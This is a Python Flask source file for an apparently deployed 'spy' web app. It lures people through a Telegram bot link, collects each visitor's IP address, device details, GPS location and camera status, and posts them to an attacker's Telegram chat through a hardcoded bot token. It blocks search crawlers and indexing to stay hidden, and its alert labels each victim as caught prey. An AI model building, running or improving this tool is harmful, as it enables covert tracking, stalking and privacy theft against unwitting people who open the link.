from flask import Flask, request, render_template, send_from_directory
import requests, os

app = Flask(__name__, template_folder="templates", static_folder="static")

# === Telegram Bot Configuration ===
BOT_TOKEN = "7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg"
CHAT_ID = "6908281054"

# === Block known bots via User-Agent ===
BLOCKED_BOTS = [
    "Googlebot", "Bingbot", "Slurp", "DuckDuckBot", "Baiduspider",
    "YandexBot", "Sogou", "Exabot", "facebot", "ia_archiver"
]

# === Serve robots.txt to block crawlers ===
@app.route('/robots.txt')
def robots():
    return "User-agent: *\nDisallow: /", 200, {'Content-Type': 'text/plain'}

# === Home Page ===
@app.route('/')
def home():
    ua = request.headers.get('User-Agent', '')
    if any(bot in ua for bot in BLOCKED_BOTS):
        return "Access Denied", 403
    return render_template("spy.html")

# === Data Collection Endpoint ===
@app.route('/collect', methods=['POST'])
def collect():
    data = request.json
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = data.get("userAgent", "Unknown")
    device_info = data.get("deviceInfo", "Unknown")
    latitude = data.get("latitude")
    longitude = data.get("longitude")
    camera = data.get("camera", "❌ Unknown")
    location = f"https://maps.google.com/?q={latitude},{longitude}" if latitude and longitude else "❌ Location Not Available"

    message = f"""
👁️ شکار آیا!
🌐 IP Address: {ip}
📱 Device: {user_agent}
📍 Location: {location}
📷 Camera: {camera}
🧠 Device Info: {device_info}
"""

    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
        'chat_id': CHAT_ID,
        'text': message
    })

    return "Data Received", 200

# === Telegram Webhook ===
@app.route(f"/{BOT_TOKEN}", methods=['POST'])
def telegram_webhook():
    update = request.get_json()
    if "message" in update:
        chat_id = update["message"]["chat"]["id"]
        if update["message"].get("text") == "/start":
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
                "chat_id": chat_id,
                "text": "👋 خوش آمدید!\n👇 نیچے دیے گئے لنک پر کلک کریں:\nhttps://faizan-spybot.onrender.com"
            })
    return "ok", 200

# === Run the App ===
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
